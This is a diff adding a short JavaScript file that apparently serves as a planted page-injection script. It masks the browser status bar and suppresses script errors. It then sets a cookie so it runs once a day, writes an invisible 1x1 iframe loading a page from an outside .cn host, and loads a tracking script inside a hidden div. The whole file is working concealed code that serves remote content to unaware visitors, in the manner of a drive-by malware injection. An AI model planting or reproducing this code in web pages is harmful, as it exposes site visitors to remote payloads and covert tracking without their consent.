@@ -1,0 +1,24 @@
+document.writeln("<base onmouseover=\"window.status=\'Íê±Ï                                                  \';return true\">");
+document.writeln("<SCRIPT LANGUAGE=\"JavaScript\"> ");
+document.writeln("<!-- Hide ");
+document.writeln("function killErrors() { ");
+document.writeln("return true; ");
+document.writeln("} ");
+document.writeln("window.onerror = killErrors; ");
+document.writeln("\/\/ --> ");
+document.writeln("<\/SCRIPT>");
+function Get(){
+var Then = new Date() 
+Then.setTime(Then.getTime() + 24*60*60*1000)
+var cookieString = new String(document.cookie)
+var cookieHeader = "Cookie10=" 
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition != -1){ 
+} else 
+{ document.cookie = "Cookie10=risb;expires="+ Then.toGMTString()
+document.writeln("<IFRaME src=\"http://d.godaand.cn/bao/hei.htm\" width=1 height=1><\/IFRAME>");
+document.write("<div style=\"display:none\">");
+document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/1878276.js"></script>');
+
+}
+}Get();
